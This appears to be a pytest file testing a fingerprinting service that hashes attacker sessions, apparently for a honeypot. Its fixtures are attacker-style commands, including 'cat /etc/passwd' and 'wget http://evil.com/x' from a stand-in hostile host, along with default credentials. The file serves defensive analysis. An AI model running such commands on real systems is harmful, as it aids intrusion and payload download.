from __future__ import annotations
from datetime import datetime, timezone, timedelta
import pytest
from app.services.fingerprint import compute_fingerprint


class TestFingerprint:
    def test_empty_returns_hash(self):
        fp, fv = compute_fingerprint([], [], [], [])
        assert isinstance(fp, str)
        assert len(fp) == 64

    def test_same_inputs_same_fingerprint(self):
        cmds = ["whoami", "id", "uname -a", "ls /tmp", "cat /etc/passwd"]
        users = ["root", "admin"]
        passws = ["root", "admin"]
        now = datetime.now(timezone.utc)
        ts = [now + timedelta(seconds=i * 10) for i in range(5)]

        fp1, fv1 = compute_fingerprint(cmds, users, passws, ts)
        fp2, fv2 = compute_fingerprint(cmds, users, passws, ts)
        assert fp1 == fp2

    def test_different_commands_different_fingerprint(self):
        now = datetime.now(timezone.utc)
        ts = [now + timedelta(seconds=i * 10) for i in range(3)]

        fp1, _ = compute_fingerprint(["whoami", "id", "ls"], [], [], ts)
        fp2, _ = compute_fingerprint(["ps aux", "netstat", "top"], [], [], ts)
        assert fp1 != fp2

    def test_only_first_5_commands_matter(self):
        now = datetime.now(timezone.utc)
        ts = [now + timedelta(seconds=i) for i in range(10)]
        cmds_base = ["whoami", "id", "uname -a", "ls", "cat /etc/passwd"]

        fp1, _ = compute_fingerprint(cmds_base, [], [], ts)
        fp2, _ = compute_fingerprint(cmds_base + ["extra1", "extra2", "extra3"], [], [], ts)
        assert fp1 == fp2

    def test_feature_vector_keys(self):
        now = datetime.now(timezone.utc)
        ts = [now + timedelta(seconds=i * 5) for i in range(5)]
        _, fv = compute_fingerprint(
            ["whoami", "wget http://evil.com/x"],
            ["root", "admin"],
            ["password", "root"],
            ts,
        )
        expected_keys = [
            "num_commands", "num_distinct_commands", "num_usernames", "num_passwords",
            "num_distinct_usernames", "num_distinct_passwords", "median_gap_seconds",
            "total_events", "has_download", "has_persistence",
        ]
        for key in expected_keys:
            assert key in fv

